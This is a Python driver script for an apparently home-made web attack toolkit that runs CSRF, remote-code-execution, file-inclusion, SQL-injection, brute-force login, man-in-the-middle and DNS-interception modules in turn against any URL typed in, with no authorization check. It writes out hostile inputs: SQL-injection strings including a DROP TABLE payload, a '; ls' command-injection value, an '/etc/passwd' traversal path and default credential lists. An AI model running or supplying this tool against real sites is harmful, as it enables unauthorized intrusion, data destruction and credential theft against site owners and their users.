import time
from brute_force_login import brute_force_login
from csrf_attack import exploit_csrf
from dir_buster import brute_force_directories
from dns_interception import dns_interception
from email_extraction import extract_emails_from_url
from exploit import exploit_rce
from http_header_fuzzer import fuzz_http_headers
from lfi_rfi_attack import exploit_lfi_rfi
from mitm_attack import mitm_attack
from poc_generator import generate_poc
from rce_attack import exploit_rce
from recon import recon
from report_generator import generate_report
from scanner import run_scanner
from shodan_api import shodan_attack
from sqli_fuzzer import fuzz_sql_injection
from ssl_test import test_ssl_security
from subdomain_finder import find_subdomains
from zap_scan import zap_scan


# Attack and scan configurations
username_list = ["admin", "test", "root"]
password_list = ["admin123", "password123", "123456"]
payloads_sql_injection = ["' OR 1=1 --", "' OR 'a'='a", "'; DROP TABLE users; --"]
subdomain_wordlist = ["www", "dev", "staging", "api", "shop"]

# Main function to automate all tests
def run_automated_tests(target_url):
    print(f"\nStarting automated tests on {target_url}...\n")
    
    # Recon Phase
    print("\nStarting reconnaissance phase...\n")
    recon(target_url)
    subdomains = find_subdomains(target_url)
    
    # Attack Phase
    print("\nStarting attack phase...\n")

    # 1. CSRF Attack
    print("Running CSRF attack...")
    csrf_token = "example_csrf_token"  # This would be dynamically fetched in real usage
    exploit_csrf(target_url, csrf_token)
    
    # 2. RCE Attack
    print("Running RCE attack...")
    exploit_rce(target_url, "; ls")  # Payload for testing RCE
    
    # 3. LFI/RFI Attack
    print("Running LFI/RFI attack...")
    exploit_lfi_rfi(target_url, "../../../etc/passwd")  # Example LFI payload
    
    # 4. SQL Injection Fuzzing
    print("Running SQL Injection fuzzing...")
    fuzz_sql_injection(target_url, payloads_sql_injection)
    
    # 5. Brute Force Login
    print("Running Brute Force Login...")
    brute_force_login(target_url, username_list, password_list)
    
    # 6. Directory Bruteforce
    print("Running Directory Bruteforce...")
    with open("wordlist.txt", "r") as file:  # Make sure to provide a valid wordlist
        wordlist = file.read().splitlines()
    brute_force_directories(target_url, wordlist)

    # 7. Email Extraction
    print("Running Email Extraction...")
    extract_emails_from_url(target_url)

    # 8. HTTP Header Fuzzing
    print("Running HTTP Header Fuzzing...")
    headers_to_fuzz = {"X-Forwarded-For": "1.1.1.1", "X-Real-IP": "1.1.1.1"}
    fuzz_http_headers(target_url, headers_to_fuzz)

    # 9. Man-in-the-Middle Attack
    print("Running MITM Attack...")
    mitm_attack(target_url)
    
    # 10. DNS Interception
    print("Running DNS Interception...")
    dns_interception(target_url)

    # 11. SSL Test
    print("Running SSL Test...")
    test_ssl_security(target_url)

    # 12. Shodan API Scan
    print("Running Shodan API Scan...")
    shodan_attack(target_url)
    
    # 13. Subdomain Enumeration
    print("Running Subdomain Enumeration...")
    find_subdomains(target_url)
    
    # 14. ZAP Scan
    print("Running ZAP Scan...")
    zap_scan(target_url)
    
    # Generate Proof of Concept (POC)
    print("Generating Proof of Concept (POC)...")
    generate_poc(target_url)

    # Generate Report
    print("Generating Report...")
    generate_report(target_url)

    print("\nAutomation complete!")

# Entry point of the program
if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    run_automated_tests(target_url)
